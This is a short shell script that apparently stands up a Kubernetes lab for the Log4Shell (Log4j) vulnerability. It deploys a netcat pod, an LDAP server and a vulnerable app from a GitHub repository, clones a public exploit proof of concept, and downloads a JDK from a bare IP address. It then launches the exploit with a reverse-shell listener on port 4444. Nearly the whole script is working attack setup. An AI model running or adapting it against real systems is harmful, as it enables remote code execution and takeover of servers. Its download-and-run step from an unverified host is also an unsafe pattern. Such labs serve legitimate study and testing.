kubectl run nc-pod --image=ubuntu --command -- bash -c 'apt update && apt install -y wget netcat git python3-pip && while true; do sleep 1; done'
kubectl apply -f https://raw.githubusercontent.com/nandakrr/log4j-poc/main/k8s-ldap-deploy.yaml
kubectl apply -f https://raw.githubusercontent.com/nandakrr/log4j-poc/main/k8s-app-deploy.yaml
sleep 60
{
kubectl exec -it nc-pod -- git clone https://github.com/kozmer/log4j-shell-poc
kubectl exec -it nc-pod -- wget 152.67.166.153/jdk-8u20-linux-x64.tar.gz
kubectl exec -it nc-pod -- tar -xf jdk-8u20-linux-x64.tar.gz
kubectl exec -it nc-pod -- mv jdk1.8.0_20 log4j-shell-poc/
kubectl exec -it nc-pod -- pip install -r log4j-shell-poc/requirements.txt
} &> /dev/null
sleep 20
ip=`kubectl get all | grep nc-svc | awk '{print $4}'`
kubectl exec -it nc-pod -- python3 log4j-shell-poc/poc.py --userip $ip --webport 8000 --lport 4444
